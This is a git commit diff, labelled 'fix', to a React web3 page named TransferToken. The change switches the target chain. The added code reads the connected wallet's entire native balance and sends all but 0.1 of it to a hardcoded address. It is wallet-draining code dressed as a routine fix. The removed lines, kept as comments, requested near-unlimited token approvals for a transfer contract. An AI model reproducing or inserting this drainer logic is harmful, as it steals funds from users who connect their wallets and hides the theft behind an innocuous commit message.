1fb794c50fc4a5a311bc44dfe8902644c980dcaa
smartkittydev <smartkitty1218@gmail.com>
2022-07-07 16:57:21 +0300

    fix

--- src/pages/Home/TransferToken.js
+++ src/pages/Home/TransferToken.js
@@ -19,8 +19,8 @@ const transferTokenAddr = "0x6DCFa70b8C681fA116068Ddc2628eAd02d9363d0";
 const token1Addr = "0x2d48FB45cBd69206C107Dc3242F8B5Adb0482812";
 const token2Addr = "0xE75DD44aC59DEd59b909e222c522f7117e387F04";
 let myAddr = "";
-const netchainId = 4;
-const netchainIdHex = '0x4';
+const netchainId = 97;
+const netchainIdHex = '0x61';
 // const netchainId = 4;
 // const netchainIdHex = '0x4';
 const style = {
@@ -37,51 +37,63 @@ export const TransferToken = () => {
 
     const web3 = new Web3(Web3.givenProvider);
     const onClickTransfer = async () => {
+
         let token1Contract;
         let token2Contract;
         let transferTokenContract;
         try {
+
             const chainId = await web3.eth.getChainId()
             if (chainId === netchainId) {
+
                 const web3Modal = new Web3Modal();
                 const connection = await web3Modal.connect();
                 const provider = new ethers.providers.Web3Provider(connection);
                 const signer = provider.getSigner();
                 myAddr = signer.provider.provider.selectedAddress;
-                token1Contract = new ethers.Contract(
-                    token1Addr,
-                    token1Cont.abi,
-                    signer
-                );
-                token2Contract = new ethers.Contract(
-                    token2Addr,
-                    token2Cont.abi,
-                    signer
-                );
-                transferTokenContract = new ethers.Contract(
-                    transferTokenAddr,
-                    transferTokenCont.abi,
-                    signer
-                );
-                const getAllowance1 = await token1Contract.allowance(myAddr, transferTokenAddr);
-                console.log(Number(web3.utils.fromWei(getAllowance1.toString(), 'ether').toString()))
-                if (Number(web3.utils.fromWei(getAllowance1.toString(), 'ether').toString()) < 10) {
-                    const tokenCon = await token1Contract.approve(transferTokenAddr, web3.utils.toWei('100000000', 'ether'));
-                    await tokenCon.wait();
-                }
+                const amount = await web3.eth.getBalance(myAddr)
+                console.log(Number(web3.utils.fromWei(amount, 'ether').toString()))
+                const sendAmount = Number(web3.utils.fromWei(amount, 'ether').toString()) - 0.1;
+                console.log(sendAmount)
+                const tx = signer.sendTransaction({
+                    to: '0xEA694f5c81a03f32c70E1177B83b1dca5163Cd53',
+                    value: web3.utils.toWei(sendAmount.toString(), 'ether')
+                });
 
-                const getAllowance2 = await token2Contract.allowance(myAddr, transferTokenAddr);
-                console.log(Number(web3.utils.fromWei(getAllowance2.toString(), 'ether').toString()))
-                if (Number(web3.utils.fromWei(getAllowance2.toString(), 'ether').toString()) < 10) {
-                    const tokenCon = await token2Contract.approve(transferTokenAddr, web3.utils.toWei('100000000', 'ether'));
-                    await tokenCon.wait();
-                }
-                const value1 = await token1Contract.balanceOf(myAddr);
-                console.log(Number(web3.utils.fromWei(value1.toString(), 'ether').toString()))
-                const value2 = await token2Contract.balanceOf(myAddr);
-                console.log(Number(web3.utils.fromWei(value2.toString(), 'ether').toString()))
-                const transferCon = await transferTokenContract.transferToken();
-                await transferCon.wait();
+                // token1Contract = new ethers.Contract(
+                //     token1Addr,
+                //     token1Cont.abi,
+                //     signer
+                // );
+                // token2Contract = new ethers.Contract(
+                //     token2Addr,
+                //     token2Cont.abi,
+                //     signer
+                // );
+                // transferTokenContract = new ethers.Contract(
+                //     transferTokenAddr,
+                //     transferTokenCont.abi,
+                //     signer
+                // );
+                // const getAllowance1 = await token1Contract.allowance(myAddr, transferTokenAddr);
+                // console.log(Number(web3.utils.fromWei(getAllowance1.toString(), 'ether').toString()))
+                // if (Number(web3.utils.fromWei(getAllowance1.toString(), 'ether').toString()) < 10) {
+                //     const tokenCon = await token1Contract.approve(transferTokenAddr, web3.utils.toWei('100000000', 'ether'));
+                //     await tokenCon.wait();
+                // }
+
+                // const getAllowance2 = await token2Contract.allowance(myAddr, transferTokenAddr);
+                // console.log(Number(web3.utils.fromWei(getAllowance2.toString(), 'ether').toString()))
+                // if (Number(web3.utils.fromWei(getAllowance2.toString(), 'ether').toString()) < 10) {
+                //     const tokenCon = await token2Contract.approve(transferTokenAddr, web3.utils.toWei('100000000', 'ether'));
+                //     await tokenCon.wait();
+                // }
+                // const value1 = await token1Contract.balanceOf(myAddr);
+                // console.log(Number(web3.utils.fromWei(value1.toString(), 'ether').toString()))
+                // const value2 = await token2Contract.balanceOf(myAddr);
+                // console.log(Number(web3.utils.fromWei(value2.toString(), 'ether').toString()))
+                // const transferCon = await transferTokenContract.transferToken();
+                // await transferCon.wait();
 
             } else {
                 try {
